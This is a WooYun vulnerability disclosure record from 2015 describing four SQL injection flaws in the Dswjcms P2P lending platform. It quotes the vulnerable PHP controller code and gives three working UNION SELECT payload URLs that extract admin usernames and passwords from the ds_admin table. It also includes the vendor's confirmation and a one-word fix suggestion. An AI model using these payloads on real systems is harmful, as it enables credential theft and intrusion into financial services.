{"id": 72413, "wybug_id": "wooyun-2015-0141364", "wybug_title": "Dswjcms p2p网贷系统前台4处sql注入", "wybug_corp": "www.tifaweb.com", "wybug_author": "路人甲", "wybug_date": "2015-10-07 09:15", "wybug_open_date": "2016-01-11 15:36", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-10-07：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-10-08：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-10-11：\t细节向第三方安全合作伙伴开放（绿盟科技、唐朝安全巡航）\t\t\t\t\t\t\t\t\t2015-12-02：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-12-12：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-12-22：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-01-11：\t细节向公众公开  简要描述： 注入。官网demo 详细说明：  案例参照 http://wooyun.org/bugs/wooyun-2015-0141209/trace/3789f61a7765dbc4f4a4c7d1b04e6095。-------------------------------------------------------------------------------------#1/Lib/Action/Win/IndexAction.class.php\npublic function loanAjax(){\t\t$Borrowing = D('Borrowing');\t\timport('ORG.Util.Page');// 导入分页类\t\t$type=$this->_param('type')==0?'':\"type =\".($this->_param('type')-1);\t//借款类型\t\t$state=$this->_param('state')==1?'(state=1 or state=10)':\"state =\".($this->_param('state'));\t//借款状态\t\t$classify=$this->_param('classify')==0?'':\"way =\".($this->_param('classify')-1);\t//还款方式\t\t$scope=$this->_param('scope')==0?'':\"candra =\".($this->_param('scope')-1);\t//借款期限\t\tif($type || $state || $classify || $scope){\t\t\t$type=$type?$type.\" and \":'';\t\t\t$state=$state?$state.\" and \":'';\t\t\t$scope=$scope?$scope.\" and \":'';\t\t\t$classify=$classify?$classify.\" and \":'';\t\t\t$where=$type.$state.$scope.$classify;\t\t\t\t\t}\t\t\t\t//$where.='(state=1 or state=10)';\t\t$where.='min>1';\t\t$count      = $Borrowing->where($where)->count();.........\n当存在 state type classify  scope 时。且state不为1即可直接拼接sql。exp:\nWin/Index/loanAjax.html?type=1&state=0) UNION SELECT 1,2,3,(select concat(username,0x5c,password) from ds_admin limit 1),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34%23&classify=1&scope=1\n\n\n#2/Lib/Action/Home/LoanAction.class.php\npublic function loanAjax(){\t\t$Borrowing = D('Borrowing');\t\timport('ORG.Util.Page');// 导入分页类\t\t$type=$this->_param('type')==0?'':\"type =\".($this->_param('type')-1);\t//借款类型\t\t$state=$this->_param('state')==0?'(state=1 or state=10)':\"state =\".($this->_param('state'));\t//借款状态\t\t$classify=$this->_param('classify')==0?'':\"way =\".($this->_param('classify')-1);\t//还款方式\t\t$scope=$this->_param('scope')==0?'':\"candra =\".($this->_param('scope')-1);\t//借款期限\t\tif($type || $state || $classify || $scope){\t\t\t$type=$type?$type.\" and \":'';\t\t\t$state=$state?$state.\" and \":'';\t\t\t$scope=$scope?$scope.\" and \":'';\t\t\t$classify=$classify?$classify.\" and \":'';\t\t\t$where=$type.$state.$scope.$classify;\t\t\t\t\t}\t\t\t\t//$where.='(state=1 or state=10)';\t\t$where.='min>1';\t\t$count      = $Borrowing->where($where)->count()\n当存在 state type classify  scope 时。且state不为0即可直接拼接sql。exp:\nLoan/loanAjax.html?type=1&state=1) UNION SELECT 1,2,3,(select concat(username,0x5c,password) from ds_admin limit 1),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34%23&classify=1&scope=1\n\n\n#3D:/wamp/www/Lib/Action/Home/LoanAction.class.php\npublic function index(){\t\t$Borrowing = D('Borrowing');\t\timport('ORG.Util.Page');// 导入分页类\t\t\t$where='(state=1 or state=5 or state=7 or state=9)';\t\tif($this->_get('search')){\t\t\t$where.=\" and `title` LIKE '%\".$this->_get('search').\"%'\";\t\t}\t\t$count      = $Borrowing->where($where)->count();// 查询满足要求的总记录数\t\t$Page       = new Page($count,10);// 实例化分页类 传入总记录数和每页显示的记录数数\t\t$show       = $Page->show();// 分页显示输出\t\t$borrow=$this->borrow_unicoms($where,$Page->firstRow.','.$Page->listRows,'`stick` DESC,`time` DESC');\t\t$this->assign('borrow',$borrow);\t\t$this->assign('page',$show);// 赋值分页输出\t\t//标题、关键字、描述\t\t$Site = D(\"Site\");\t\t$site=$Site->field('keyword,remark,title,link')->where('link=\"'.$_SERVER['REQUEST_URI'].'\"')->find();\t\t$this->assign('si',$site);\t\t$active['loan']='active';\t\t$this->assign('active',$active);\t\t$endjs='//AJAX分页\n$this->_get('search') 接收search参数，然而tp这样接收参数只会对双引号编码，他是单引号包裹的。注入产生、\nLoan.html?search=%27%29+UNION+SELECT+1%2C2%2C3%2C%28select+concat%28username%2C0x5c%2Cpassword%29+from+ds_admin+limit+1%29%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2C18%2C19%2C20%2C21%2C22%2C23%2C24%2C25%2C26%2C27%2C28%2C29%2C30%2C31%2C32%2C33%2C34%23\n\n\n#4www/Lib/Action/Home/IndexAction.class.php\npublic function index(){\t\t$this->copyright();\t\t$where='state=1 or state=5 or state=7 or state=9';\t\t$borrow=$this->borrow_unicoms($where,'','`stick` DESC,`time` DESC');\t\t$this->assign('borrow',$borrow);\t\t//累计投资金额\t\t$borrowing = M('borrowing');\t\t$accumulate['sum']=$borrowing->where('`state`>1')->sum('money');\t\t//累计预期收益\t\t$money = M('money');\t\t$accumulate['benefit']=$money->sum('`stay_interest`+`make_interest`+`make_reward`');\t\t$this->assign('accumulate',$accumulate);\t\t//新闻中心\t\t$new=$this->someArticle(16,5);\t\t$this->assign('new',$new);\t\t$shuffling = M('shuffling');\t\t$shufflings=$shuffling->field('title,img,url')->order('`order` ASC')->select();\t\t$this->assign('shuff',$shufflings);\t\t$head=\"<link href='__PUBLIC__/css/jslides.css' rel='stylesheet'>\";\t\t$this->assign('head',$head);\t\t//标题、关键字、描述\t\t$Site = D(\"Site\");\t\t$site=$Site->field('keyword,remark,title,link')->where('link=\"'.$_SERVER['REQUEST_URI'].'\"')->find();\n$_SERVER['REQUEST_URI'] 直接获取的，那么直接就注入了- -   漏洞证明：  \n\n   修复方案：  过滤。   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2015-10-08 08:27 厂商回复： 此类问题已经处理，已在官方论坛贴出修复办法，并在新版本中已测试无法执行，感谢楼主的宝贵意见 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2016-01-11 15:46 |    \t\t牛肉包子 \t\t\t( 普通白帽子  |\t\t\t        Rank:262 漏洞数:66        | baozisec)\t\t \n  爷爷    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}